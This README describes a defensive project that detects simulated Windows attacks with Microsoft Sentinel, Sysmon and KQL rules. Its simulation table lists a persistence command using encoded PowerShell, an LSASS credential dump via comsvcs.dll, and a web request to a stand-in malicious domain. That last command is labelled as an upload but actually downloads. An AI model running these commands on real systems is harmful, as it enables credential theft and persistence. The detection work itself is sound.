# Sentinel-Custom-Detections

This project simulates 3 common attack techniques on a Windows VM, detects them using **Microsoft Sentinel + Sysmon**, and responds with alerts and automation. One detection rule is enhanced using a **Threat Intelligence Watchlist** to detect exfiltration attempts to known malicious domains.

---

## Objectives

- Simulate real-world attacker behavior (Scheduled Task, LSASS Dump, HTTP Exfiltration)
- Ingest **Sysmon logs** from a Windows VM into Microsoft Sentinel
- Write custom **KQL detection rules**
- Create **Scheduled Analytics Rules** for proactive detection
- Enhance detection logic using **Sentinel Watchlists**
- Generate **incidents** and document the end-to-end detection workflow

---

## Folder Structure

Sentinel-Custom-Detections/
├── kql/
│ ├── persistence-taskcreation.kql
│ ├── credentialaccess-lsassdump.kql
│ └── exfiltration.kql
├── watchlist/
│ └── M-Domains.csv
├── docs/
│ ├── hunting-guide.md
│ └── screenshots/
├── README.md

```

## 🔧 Tools Used

| Tool                     | Purpose                                                  |
|--------------------------|----------------------------------------------------------|
| Microsoft Sentinel       | SIEM platform to collect, correlate, and detect threats  |
| Sysmon                   | Generates detailed Windows event logs                    |
| KQL                      | Query language to build custom detections                |
| Sentinel Watchlist       | Ingest domain IOCs for enrichment                        |
| Logic App (optional)     | Automation (e.g., send email on detection)               |
| Windows VM               | Simulated endpoint for generating attacks                |
```
```
## Simulated Attacks

| Attack Type              | Simulation Command |
|--------------------------|--------------------|
| Scheduled Task (Persistence) | `schtasks /create /tn "Updater" /tr "powershell.exe -enc ..." /sc onlogon` |
| LSASS Dump (Credential Access) | `rundll32.exe comsvcs.dll, MiniDump 1234 C:\temp\lsass.dmp` |
| HTTP Upload (Exfiltration) | `Invoke-WebRequest -Uri http://maliciousdomain.com/file.zip -OutFile C:\temp\data.zip` |
```
---

##Detection Logic (KQL)

All queries are in the `kql/` folder:

- `persistence-taskcreation.kql`: Detects creation of scheduled tasks using `schtasks`
- `credentialaccess-lsassdump.kql`: Detects use of `rundll32.exe` or `procdump.exe` to dump LSASS
- `exfiltration-upload.kql`: Detects outbound network connections to domains from the **watchlist**

**Watchlist Integration**:

The exfiltration rule was upgraded to match **malicious domains** from `M-Domains.csv` (uploaded as a Sentinel Watchlist).

---
```
## Alerting Workflow

For each `.kql`:

1. Go to Microsoft Sentinel → Analytics → **+ Create → Scheduled query rule**
2. Set:
   - Frequency: `5 minutes`
   - Lookup period: `5 minutes`
   - MITRE tactic
   - Severity: Medium or High
   - Entity mapping: `Computer → Host`
3. Optionally attach **Logic App** for automated response (e.g., email alert)
```
